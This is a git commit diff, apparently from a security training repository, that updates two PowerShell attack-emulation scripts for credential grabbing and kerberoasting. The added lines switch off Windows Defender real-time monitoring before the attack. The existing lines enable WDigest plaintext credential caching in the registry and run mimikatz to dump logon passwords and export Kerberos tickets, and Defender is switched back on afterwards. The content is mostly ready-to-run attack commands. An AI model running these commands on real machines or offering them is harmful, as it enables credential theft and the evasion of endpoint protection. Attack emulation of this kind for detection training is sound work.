4eeb8b41eb9aa693bb4c6d123a638fcdc7881081
treyescairo-pluralsight <64978363+treyescairo-pluralsight@users.noreply.github.com>
2024-03-20 14:31:21 -0600

    Update attacks

--- endpoint_attacks/credential_grabbing/ttp.ps1
+++ endpoint_attacks/credential_grabbing/ttp.ps1
@@ -1,3 +1,10 @@
+<# Disable Windows Defender #>
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+<# Attack #>
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d
 
 . C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe "privilege::debug" "log log.txt" "sekurlsa::logonpasswords" "sekurlsa::wdigest" "exit"
+
+<# Enable Windows Defender #>
+Set-MpPreference -DisableRealtimeMonitoring $false
--- endpoint_attacks/kerberoasting/ttp.ps1
+++ endpoint_attacks/kerberoasting/ttp.ps1
@@ -1,1 +1,8 @@
+<# Disable Windows Defender #>
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+<# Attack #>
 . C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe "log log.txt" "privilege::debug" "sekurlsa::tickets /export" "exit"
+
+<# Enable Windows Defender #>
+Set-MpPreference -DisableRealtimeMonitoring $false
